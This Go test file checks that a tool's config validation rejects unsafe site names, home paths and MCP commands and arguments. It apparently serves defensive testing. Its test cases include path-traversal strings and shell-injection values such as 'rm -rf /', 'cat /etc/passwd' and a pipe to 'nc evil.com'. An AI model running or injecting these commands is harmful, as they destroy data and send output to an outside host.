package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateSiteName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid names
		{name: "simple name", input: "my-site", wantErr: false},
		{name: "with underscore", input: "site_2", wantErr: false},
		{name: "with dot", input: "prod.v1", wantErr: false},
		{name: "alphanumeric only", input: "mysite123", wantErr: false},
		{name: "starts with number", input: "123site", wantErr: false},
		{name: "complex valid", input: "my-site_v2.prod", wantErr: false},

		// Invalid names
		{name: "empty string", input: "", wantErr: true},
		{name: "current dir", input: ".", wantErr: true},
		{name: "parent dir", input: "..", wantErr: true},
		{name: "path traversal up", input: "../etc", wantErr: true},
		{name: "path traversal deep", input: "../../tmp/evil", wantErr: true},
		{name: "forward slash", input: "foo/bar", wantErr: true},
		{name: "backslash", input: "foo\\bar", wantErr: true},
		{name: "null byte", input: "foo\x00bar", wantErr: true},
		{name: "absolute path", input: "/etc/passwd", wantErr: true},
		{name: "starts with dot", input: ".hidden", wantErr: true},
		{name: "starts with hyphen", input: "-badname", wantErr: true},
		{name: "contains space", input: "my site", wantErr: true},
		{name: "contains special char", input: "site@prod", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateSiteName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSiteName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestSitePath(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid names should produce paths under SitesDir()
		{name: "valid simple", input: "mysite", wantErr: false},
		{name: "valid complex", input: "my-site_v2.prod", wantErr: false},

		// Invalid names should fail validation
		{name: "traversal attempt", input: "../etc", wantErr: true},
		{name: "absolute path", input: "/etc/passwd", wantErr: true},
		{name: "empty", input: "", wantErr: true},
		{name: "dot", input: ".", wantErr: true},
		{name: "dotdot", input: "..", wantErr: true},
	}

	sitesDir := SitesDir()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			path, err := SitePath(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("SitePath(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
				return
			}

			if err == nil {
				// Verify the path is under sitesDir
				if !strings.HasPrefix(path, sitesDir) {
					t.Errorf("SitePath(%q) = %q, does not start with sitesDir %q", tt.input, path, sitesDir)
				}

				// Verify the path contains the site name
				expectedPath := filepath.Join(sitesDir, tt.input)
				if path != expectedPath {
					t.Errorf("SitePath(%q) = %q, want %q", tt.input, path, expectedPath)
				}

				// Verify the path doesn't escape sitesDir
				relPath, err := filepath.Rel(sitesDir, path)
				if err != nil {
					t.Errorf("SitePath(%q) produced path that can't be made relative to sitesDir: %v", tt.input, err)
				}
				if strings.HasPrefix(relPath, ".."+string(filepath.Separator)) || relPath == ".." {
					t.Errorf("SitePath(%q) produced path that escapes sitesDir: %q", tt.input, relPath)
				}
			}
		})
	}
}

func TestValidateBragctlHome(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		// Valid paths (absolute, not in system dirs)
		{name: "user home subdir", path: "/home/user/.bragctl", wantErr: false},
		{name: "user home custom", path: "/home/user/brag", wantErr: false},
		{name: "tmp directory", path: "/tmp/bragctl", wantErr: false},
		{name: "opt directory", path: "/opt/bragctl", wantErr: false},

		// Invalid paths
		{name: "empty", path: "", wantErr: true},
		{name: "relative path", path: "bragctl", wantErr: true},
		{name: "relative with dots", path: "../bragctl", wantErr: true},
		{name: "dot current", path: ".", wantErr: true},
		{name: "etc directory", path: "/etc/bragctl", wantErr: true},
		{name: "etc exact", path: "/etc", wantErr: true},
		{name: "usr directory", path: "/usr/bragctl", wantErr: true},
		{name: "var directory", path: "/var/bragctl", wantErr: true},
		{name: "bin directory", path: "/bin/bragctl", wantErr: true},
		{name: "sbin directory", path: "/sbin/bragctl", wantErr: true},
		{name: "dev directory", path: "/dev/bragctl", wantErr: true},
		{name: "proc directory", path: "/proc/bragctl", wantErr: true},
		{name: "sys directory", path: "/sys/bragctl", wantErr: true},
		{name: "boot directory", path: "/boot/bragctl", wantErr: true},
		{name: "lib directory", path: "/lib/bragctl", wantErr: true},
		{name: "lib64 directory", path: "/lib64/bragctl", wantErr: true},
		{name: "with dot-dot component", path: "/home/user/../etc/bragctl", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateBragctlHome(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateBragctlHome(%q) error = %v, wantErr %v", tt.path, err, tt.wantErr)
			}
		})
	}
}

func TestBaseDirWithInvalidBRAGCTL_HOME(t *testing.T) {
	// Save original env
	original := os.Getenv("BRAGCTL_HOME")
	defer func() {
		if original != "" {
			_ = os.Setenv("BRAGCTL_HOME", original)
		} else {
			_ = os.Unsetenv("BRAGCTL_HOME")
		}
	}()

	// Test with invalid BRAGCTL_HOME - should fall back to default
	testCases := []string{
		"/etc/bragctl",      // System directory
		"relative/path",     // Relative path
		"/home/user/../etc", // Contains ..
	}

	for _, tc := range testCases {
		t.Run(tc, func(t *testing.T) {
			_ = os.Setenv("BRAGCTL_HOME", tc)
			baseDir := BaseDir()

			// Should not return the invalid path
			if baseDir == tc {
				t.Errorf("BaseDir() returned invalid BRAGCTL_HOME %q, should have used default", tc)
			}

			// Should return the default path
			home, err := os.UserHomeDir()
			if err == nil {
				expectedDefault := filepath.Join(home, ".bragctl")
				if baseDir != expectedDefault {
					t.Errorf("BaseDir() = %q, want default %q", baseDir, expectedDefault)
				}
			}
		})
	}
}

func TestBaseDirWithValidBRAGCTL_HOME(t *testing.T) {
	// Save original env
	original := os.Getenv("BRAGCTL_HOME")
	defer func() {
		if original != "" {
			_ = os.Setenv("BRAGCTL_HOME", original)
		} else {
			_ = os.Unsetenv("BRAGCTL_HOME")
		}
	}()

	// Test with valid BRAGCTL_HOME - should use it
	validPath := "/tmp/test-bragctl"
	_ = os.Setenv("BRAGCTL_HOME", validPath)
	baseDir := BaseDir()

	if baseDir != validPath {
		t.Errorf("BaseDir() = %q, want %q", baseDir, validPath)
	}
}

func TestValidateMCPCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		// Valid commands
		{name: "bare wtmcp", cmd: "wtmcp", wantErr: false},
		{name: "bare wtmcp-dev", cmd: "wtmcp-dev", wantErr: false},
		{name: "bare bragctl", cmd: "bragctl", wantErr: false},
		{name: "absolute wtmcp", cmd: "/usr/local/bin/wtmcp", wantErr: false},
		{name: "absolute bragctl", cmd: "/usr/local/bin/bragctl", wantErr: false},
		{name: "absolute wtmcp-custom", cmd: "/opt/wtmcp-custom", wantErr: false},

		// Invalid commands
		{name: "empty", cmd: "", wantErr: true},
		{name: "bare other", cmd: "evil", wantErr: true},
		{name: "shell injection semicolon", cmd: "wtmcp; rm -rf /", wantErr: true},
		{name: "shell injection pipe", cmd: "wtmcp | nc evil.com 1234", wantErr: true},
		{name: "shell injection ampersand", cmd: "wtmcp && cat /etc/passwd", wantErr: true},
		{name: "shell injection dollar", cmd: "wtmcp$(whoami)", wantErr: true},
		{name: "shell injection backtick", cmd: "wtmcp`id`", wantErr: true},
		{name: "shell injection parens", cmd: "wtmcp()", wantErr: true},
		{name: "relative path", cmd: "./wtmcp", wantErr: true},
		{name: "relative path dots", cmd: "../wtmcp", wantErr: true},
		{name: "absolute non-allowed", cmd: "/bin/sh", wantErr: true},
		{name: "absolute evil", cmd: "/usr/bin/evil", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateMCPCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateMCPCommand(%q) error = %v, wantErr %v", tt.cmd, err, tt.wantErr)
			}
		})
	}
}

func TestValidateMCPArg(t *testing.T) {
	tests := []struct {
		name    string
		arg     string
		wantErr bool
	}{
		// Valid args
		{name: "simple flag", arg: "--verbose", wantErr: false},
		{name: "path arg", arg: "/tmp/workdir", wantErr: false},
		{name: "value", arg: "production", wantErr: false},

		// Invalid args
		{name: "shell injection semicolon", arg: "--arg; rm -rf /", wantErr: true},
		{name: "shell injection pipe", arg: "arg | nc evil.com", wantErr: true},
		{name: "shell injection dollar", arg: "$(whoami)", wantErr: true},
		{name: "shell injection backtick", arg: "`id`", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateMCPArg(tt.arg)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateMCPArg(%q) error = %v, wantErr %v", tt.arg, err, tt.wantErr)
			}
		})
	}
}

func TestMCPCommandValidation(t *testing.T) {
	// Test that invalid commands fall back to default
	cfg := &Config{}
	cfg.MCP.Command = "/bin/sh" // Invalid: not wtmcp or bragctl
	cmd := cfg.MCPCommand()
	if cmd != "wtmcp" {
		t.Errorf("MCPCommand() with invalid command = %q, want default \"wtmcp\"", cmd)
	}
}

func TestMCPArgsValidation(t *testing.T) {
	// Test that invalid args are skipped
	cfg := &Config{}
	cfg.MCP.Args = []string{"--valid", "; rm -rf /", "--also-valid"}
	args := cfg.MCPArgs()

	// Should have --workdir, --valid, and --also-valid, but NOT the malicious arg
	hasValid := false
	hasAlsoValid := false
	hasMalicious := false

	for _, arg := range args {
		if arg == "--valid" {
			hasValid = true
		}
		if arg == "--also-valid" {
			hasAlsoValid = true
		}
		if arg == "; rm -rf /" {
			hasMalicious = true
		}
	}

	if !hasValid {
		t.Error("MCPArgs() missing valid arg")
	}
	if !hasAlsoValid {
		t.Error("MCPArgs() missing also-valid arg")
	}
	if hasMalicious {
		t.Error("MCPArgs() included malicious arg, should have been filtered")
	}
}
